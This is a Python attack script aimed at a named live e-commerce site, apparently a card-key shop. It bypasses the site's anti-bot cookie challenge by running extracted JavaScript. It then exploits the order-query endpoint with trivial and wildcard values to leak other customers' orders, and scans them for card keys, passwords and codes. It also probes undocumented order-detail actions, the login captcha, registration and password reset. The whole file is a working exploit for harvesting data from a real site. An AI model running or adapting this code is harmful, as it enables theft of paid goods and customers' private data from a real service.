#!/usr/bin/env python3
import re, subprocess, json, time, os
from pathlib import Path

HOST='qqq.lc'
BASE=f'https://{HOST}'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
OUT=Path('/tmp/qqqlc_out3'); OUT.mkdir(exist_ok=True)

class Jar:
    def __init__(self): self.c={}
    def header(self): return '; '.join(f'{k}={v}' for k,v in self.c.items())
    def absorb(self, hdr_text):
        for line in hdr_text.splitlines():
            if line.lower().startswith('set-cookie:'):
                part=line.split(':',1)[1].strip().split(';')[0]
                if '=' in part:
                    k,v=part.split('=',1); self.c[k.strip()]=v.strip()

jar=Jar()

def curl(path, method='GET', data=None, headers=None, t=45):
    cmd=['curl','-sk','-D','-','--max-time',str(t),'-A',UA,'-H',f'Referer: {BASE}/','--max-redirs','0']
    if jar.c: cmd+=['-H',f'Cookie: {jar.header()}']
    if headers:
        for k,v in headers.items(): cmd+=['-H',f'{k}: {v}']
    url=path if path.startswith('http') else BASE+path
    if method=='POST':
        cmd+=['-X','POST','-H','Content-Type: application/x-www-form-urlencoded','--data-binary',data or '']
    cmd.append(url)
    p=subprocess.run(cmd,capture_output=True,timeout=t+15)
    text=(p.stdout or b'').decode('utf-8','replace')
    if '\r\n\r\n' in text: hdr,body=text.split('\r\n\r\n',1)
    else: hdr,body=text,''
    jar.absorb(hdr)
    code_m=re.search(r'HTTP/\S+\s+(\d+)',hdr)
    code=int(code_m.group(1)) if code_m else 0
    loc_m=re.search(r'(?im)^location:\s*(.+)$',hdr)
    loc=loc_m.group(1).strip() if loc_m else ''
    return code,body,loc

def pass_cc():
    for k in list(jar.c):
        if k.startswith('ccsafe'): del jar.c[k]
    code,body,loc=curl('/')
    m=re.search(r"setCookie\('ccsafe_defend',(.+?)\);",body)
    if not m: print('no expr'); return False
    (OUT/'expr.js').write_text('console.log('+m.group(1)+')')
    val=subprocess.check_output(['node',str(OUT/'expr.js')],timeout=20).decode().strip()
    jar.c['ccsafe_defend']=val
    jar.c['ccsafe_defend_time']='2'
    code,body,loc=curl('/')
    print('cc2',code,loc)
    if code in (301,302) and loc:
        path=loc.replace('http://qqq.lc','').replace('https://qqq.lc','')
        curl(path)
    return True

pass_cc()
print('jar',jar.header()[:160])
xhr={'X-Requested-With':'XMLHttpRequest'}

def q(data, label):
    code,body,loc=curl('/ajax.php?act=query',method='POST',data=data,headers=xhr)
    (OUT/f'q_{label}.json').write_text(body)
    try:
        j=json.loads(body)
    except Exception as e:
        print(label,'PARSE_FAIL',body[:200]); return None
    print(f'=== {label} code={j.get("code")} count={j.get("count")} total={j.get("total")} isnext={j.get("isnext")} keys={list(j.keys())}')
    data_obj=j.get('data')
    if isinstance(data_obj, dict) and data_obj:
        first=next(iter(data_obj.values()))
        print('FIRST_KEYS', sorted(first.keys()) if isinstance(first,dict) else type(first))
        print('FIRST', json.dumps(first, ensure_ascii=False)[:800])
        # scan all for kami-like
        kami_hits=[]
        for k,v in data_obj.items():
            if not isinstance(v,dict): continue
            blob=json.dumps(v,ensure_ascii=False)
            for field in ['km','kami','card','cards','value','content','result','faka','code','pass','password','out']:
                if field in v and v[field]:
                    kami_hits.append((k, field, str(v[field])[:120]))
            if '卡密' in blob or 'kami' in blob.lower():
                kami_hits.append((k,'blob',blob[:200]))
        print('KAMI_FIELD_HITS', len(kami_hits), kami_hits[:5])
        print('N_ORDERS_PAGE', len(data_obj))
    elif isinstance(data_obj, list):
        print('LIST_LEN', len(data_obj), data_obj[:2] if data_obj else None)
    return j

# baseline leak
j=q('querytype=1&qq=1&page=1','qq1_p1')
# page 2
q('querytype=1&qq=1&page=2','qq1_p2')
# other short
for s in ['2','3','0','9','a','qq','10','11','12','20','2026','202608','20260803']:
    q(f'querytype=1&qq={s}&page=1', f'qq_{s}')
    time.sleep(0.35)

# exact order id from first hit
if j and isinstance(j.get('data'),dict) and j['data']:
    oid=next(iter(j['data'].values())).get('id')
    print('OID', oid)
    for data in [
        f'querytype=1&qq={oid}',
        f'orderid={oid}',
        f'querytype=0&orderid={oid}',
        f'id={oid}',
    ]:
        q(data, 'oid_'+data[:30].replace('=','_').replace('&','_'))
        time.sleep(0.3)

# try get order detail acts
for act,data in [
    ('order','id='+(oid if j else '1')),
    ('order','orderid='+(oid if j else '1')),
    ('getorder','id='+(oid if j else '1')),
    ('query_order','id='+(oid if j else '1')),
    ('faka','id='+(oid if j else '1')),
    ('km','id='+(oid if j else '1')),
    ('card','id='+(oid if j else '1')),
    ('getkm','id='+(oid if j else '1')),
    ('show','id='+(oid if j else '1')),
]:
    code,body,loc=curl(f'/ajax.php?act={act}',method='POST',data=data,headers=xhr)
    print(f'ACT {act} {data[:40]} -> {body[:220]}')
    time.sleep(0.25)

# login page geetest extract
code,body,loc=curl('/user/login.php')
(OUT/'login2.html').write_text(body)
# scripts inline
for m in re.finditer(r'<script[^>]*>(.*?)</script>', body, re.S|re.I):
    s=m.group(1)
    if 'geetest' in s.lower() or 'captcha' in s.lower() or 'gt' in s or 'ajax' in s.lower():
        print('SCRIPT_SNIP', s[:500].replace('\n',' '))
# form fields
print('FORMS', re.findall(r'<form[^>]*>.*?</form>', body, re.S|re.I)[:2])
inputs=re.findall(r'<input[^>]+>', body, re.I)
print('INPUTS', inputs[:30])
# layer.js version path hinted build
print('layer refs', re.findall(r'layer[^\"\']+', body)[:10])

# check if query returns status/paid/km for paid orders - look at statuses in qq=1
if j and isinstance(j.get('data'),dict):
    statuses={}
    for v in j['data'].values():
        st=str(v.get('status', v.get('zt', v.get('state','?'))))
        statuses[st]=statuses.get(st,0)+1
    print('STATUSES', statuses)
    # dump all fields union
    keys=set()
    for v in j['data'].values():
        if isinstance(v,dict): keys |= set(v.keys())
    print('ALL_KEYS', sorted(keys))
    (OUT/'qq1_full.json').write_text(json.dumps(j, ensure_ascii=False, indent=2)[:200000])

# try query with empty / wildcard
for data in ['querytype=1&qq=','querytype=1&qq=%','querytype=1&qq=_','querytype=1&qq=*','querytype=1&qq=.']:
    q(data, 'wild_'+data[-3:])
    time.sleep(0.3)

# registration open?
code,body,loc=curl('/user/reg.php')
print('REG', code, len(body), 'title', re.search(r'<title>([^<]+)',body).group(1) if re.search(r'<title>',body) else None)
print('reg sn', body[:300].replace('\n',' '))
# findpwd
code,body,loc=curl('/user/findpwd.php')
print('FINDPWD', code, len(body), re.search(r'<title>([^<]+)',body).group(1) if re.search(r'<title>',body) else None)

# tools list?
code,body,loc=curl('/ajax.php?act=gettool',method='POST',data='',headers=xhr)
print('GETTOOL', body[:500])
code,body,loc=curl('/ajax.php?act=get',method='POST',data='page=1&limit=5',headers=xhr)
print('GET', body[:800])

print('DONE')
